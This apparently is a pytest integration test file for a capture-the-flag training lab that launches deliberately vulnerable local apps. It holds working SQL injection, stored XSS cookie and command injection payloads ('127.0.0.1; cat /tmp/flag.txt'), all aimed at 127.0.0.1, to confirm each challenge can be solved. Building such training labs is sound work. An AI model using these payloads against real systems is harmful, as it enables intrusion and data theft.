"""Integration tests that launch the challenge apps as real processes."""

from __future__ import annotations

import http.cookiejar
import os
import socket
import subprocess
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path

import pytest

PROJECT_ROOT = Path(__file__).resolve().parents[1]
FLAG = "FLAG{integration_test}"


def _free_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return int(sock.getsockname()[1])


def _wait_for(port: int, timeout: float = 10.0) -> None:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.5):
                return
        except OSError:
            time.sleep(0.1)
    raise RuntimeError(f"challenge did not start on port {port}")


@pytest.fixture
def challenge_port(request):
    name = request.param
    port = _free_port()
    env = dict(os.environ, PORT=str(port), LAB_FLAG=FLAG, PYTHONUNBUFFERED="1")
    proc = subprocess.Popen(
        [sys.executable, str(PROJECT_ROOT / "challenges" / name / "app.py")],
        env=env,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    try:
        _wait_for(port)
        yield port
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()


@pytest.mark.parametrize("challenge_port", ["sqli-login"], indirect=True)
def test_sqli_bypass_returns_flag(challenge_port):
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    payload = urllib.parse.urlencode(
        {"username": "' OR 1=1--", "password": "anything"}
    ).encode()
    request = urllib.request.Request(
        f"http://127.0.0.1:{challenge_port}/login", data=payload, method="POST"
    )
    body = opener.open(request, timeout=5).read().decode()
    assert FLAG in body
    assert any(cookie.name == "auth" for cookie in jar)


@pytest.mark.parametrize("challenge_port", ["xss-guestbook"], indirect=True)
def test_xss_cookie_and_stored_payload(challenge_port):
    opener = urllib.request.build_opener()
    response = opener.open(f"http://127.0.0.1:{challenge_port}/", timeout=5)
    assert f"lab_flag={FLAG}" in response.headers.get("Set-Cookie", "")
    response.read()

    payload = "<script>alert(document.cookie)</script>"
    data = urllib.parse.urlencode({"author": "tester", "body": payload}).encode()
    request = urllib.request.Request(
        f"http://127.0.0.1:{challenge_port}/guestbook", data=data, method="POST"
    )
    opener.open(request, timeout=5).read()

    page = opener.open(f"http://127.0.0.1:{challenge_port}/guestbook", timeout=5)
    assert payload in page.read().decode()


@pytest.mark.skipif(os.name != "posix", reason="cmdi challenge targets Linux containers")
@pytest.mark.parametrize("challenge_port", ["cmdi-ping"], indirect=True)
def test_command_injection_reads_flag(challenge_port):
    query = urllib.parse.urlencode({"host": "127.0.0.1; cat /tmp/flag.txt"})
    body = urllib.request.urlopen(
        f"http://127.0.0.1:{challenge_port}/tools?{query}", timeout=5
    ).read().decode()
    assert FLAG in body
